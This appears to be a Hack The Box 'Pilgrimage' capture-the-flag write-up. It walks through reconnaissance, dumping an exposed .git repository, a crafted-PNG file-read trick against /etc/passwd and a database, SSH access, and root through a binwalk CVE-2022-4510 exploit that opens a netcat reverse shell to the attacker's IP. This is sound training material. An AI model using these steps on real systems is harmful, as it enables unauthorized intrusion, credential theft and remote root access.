...
{{< img src="/img/hack-the-box-pligrimage-write-up/hack-the-box-pligrimage-write-up-01.png" >}}
...
```console
┌──(elohim㉿kali)-[~/Desktop/ROOMS/HTB/Pilgrimage]└─$ export ip=10.10.11.219
```
...
```console
┌──(elohim㉿kali)-[~/Desktop/ROOMS/HTB/Pilgrimage]└─$ ping $ip         PING 10.10.11.219 (10.10.11.219) 56(84) bytes of data.64 bytes from 10.10.11.219: icmp_seq=1 ttl=63 time=205 ms64 bytes from 10.10.11.219: icmp_seq=2 ttl=63 time=85.9 ms64 bytes from 10.10.11.219: icmp_seq=3 ttl=63 time=80.9 ms^C--- 10.10.11.219 ping statistics ---3 packets transmitted, 3 received, 0% packet loss, time 2005ms
```
...
```console
┌──(elohim㉿kali)-[~/Desktop/ROOMS/HTB/Pilgrimage]└─$ nmap -sC -T4 -p- $ip Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-19 00:19 EDTNmap scan report for 10.10.11.219Host is up (0.20s latency).Not shown: 65533 closed tcp ports (conn-refused)PORT   STATE SERVICE22/tcp open  ssh| ssh-hostkey: |   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)80/tcp open  http|_http-title: Did not follow redirect to http://pilgrimage.htb/
```
...
{{< img src="/img/hack-the-box-pligrimage-write-up/hack-the-box-pligrimage-write-up-02.png" >}}
...
{{< img src="/img/hack-the-box-pligrimage-write-up/hack-the-box-pligrimage-write-up-03.png" >}}
...
```console
┌──(elohim㉿kali)-[~/Desktop/ROOMS/THM/PickleRick]└─$ gobuster dir --url http://pilgrimage.htb:80/ -w /usr/share/wordlists/dirb/common.txt -t80   
```
...
{{< img src="/img/hack-the-box-pligrimage-write-up/hack-the-box-pligrimage-write-up-04.png" >}}
...
{{< img src="/img/hack-the-box-pligrimage-write-up/hack-the-box-pligrimage-write-up-05.png" >}}

That’s interesting! There is a **.git/** repository, let’s dump it using [git-dumper](https://github.com/arthaud/git-dumper) !

```console
┌──(elohim㉿kali)-[~/Desktop/ROOMS/THM/PickleRick]└─$ git-dumper http://pilgrimage.htb/.git/ ./git   
```

{{< img src="/img/hack-the-box-pligrimage-write-up/hack-the-box-pligrimage-write-up-06.png" caption="We have successfully dumped the content of the .git/ repository." >}}

Let’s see what we have here..

{{< img src="/img/hack-the-box-pligrimage-write-up/hack-the-box-pligrimage-write-up-07.png" >}}
...
```console
┌──(elohim㉿kali)-[~/Desktop/ROOMS/HTB/Pilgrimage]└─$ pngcrush -text a "profile" "/etc/passwd" RandomImage.png hacked.png
```

Let’s check if it worked:

```console
┌──(elohim㉿kali)-[~/Desktop/ROOMS/HTB/Pilgrimage]└─$ exiv2 -pS hacked.png                                                                        STRUCTURE OF PNG FILE: pngout.png address | chunk |  length | data                           | checksum       8 | IHDR  |      13 | .......C....                   | 0x549f91fa      33 | sRGB  |       1 |                                | 0xaece1ce9      46 | IDAT  |  524288 | x...Y.eW...}...>....f .3P.T.(. | 0x727383a3  524346 | IDAT  |   99726 | W..y-..9.....o)..o...U..B..[.B | 0x76878c85  624084 | tEXt  |      19 | profile./etc/passwd            | 0x465bd758  624115 | IEND  |       0 |                                | 0xae426082
```
...
{{< img src="/img/hack-the-box-pligrimage-write-up/hack-the-box-pligrimage-write-up-09.png" >}}

Let’s do the same thing, but with the path: “***/var/db/pilgrimage***”.

After decoding the output from hexadecimal we get this:

{{< img src="/img/hack-the-box-pligrimage-write-up/hack-the-box-pligrimage-write-up-10.png" caption="-emily<herpassword>" >}}

## |=---[ Initial Access ]

Remember the Ssh port on 22? Let’s try to connect to it with the founded password in the database.

{{< img src="/img/hack-the-box-pligrimage-write-up/hack-the-box-pligrimage-write-up-11.png" caption="Success!" >}}

The user flag is located in the emily’s personal folder:

{{< img src="/img/hack-the-box-pligrimage-write-up/hack-the-box-pligrimage-write-up-12.png" >}}
...
```console
┌──(elohim㉿kali)-[~/Desktop/PSPY]└─$ scp pspy64 emily@10.10.11.219:/tmp
```

On the target machine, make the pspy64 binary executable and then run it by tapping:

```bash
chmod u+x pspy64./pspy64
```

We get something interesting here:

{{< img src="/img/hack-the-box-pligrimage-write-up/hack-the-box-pligrimage-write-up-13.png" >}}
...
{{< img src="/img/hack-the-box-pligrimage-write-up/hack-the-box-pligrimage-write-up-14.png" caption="v2.3.2" >}}
...
```console
┌──(elohim㉿kali)-[~/…/ROOMS/HTB/Pilgrimage/CVE-2022-4510-WalkingPath]└─$ sudo python3 binwalkexploit.py RandomPic.png 10.10.16.6 1700
```
...
```console
┌──(elohim㉿kali)-[~/…/ROOMS/HTB/Pilgrimage/CVE-2022-4510-WalkingPath]└─$ sudo nc -lnvp 1700
```

```console
┌──(elohim㉿kali)-[~/…/ROOMS/HTB/Pilgrimage/CVE-2022-4510-WalkingPath]└─$ sudo scp binwalk_exploit.png emily@10.10.11.219:/var/www/pilgrimage.htb/shrunk/
```

We can see (using pspy) on the target machine that the command injected has been executed by the root user (UID=0):

{{< img src="/img/hack-the-box-pligrimage-write-up/hack-the-box-pligrimage-write-up-15.png" >}}

{{< img src="/img/hack-the-box-pligrimage-write-up/hack-the-box-pligrimage-write-up-16.png" caption="Reverse Shell established successfully" >}}

{{< img src="/img/hack-the-box-pligrimage-write-up/hack-the-box-pligrimage-write-up-17.png" caption="The root flag!" >}}
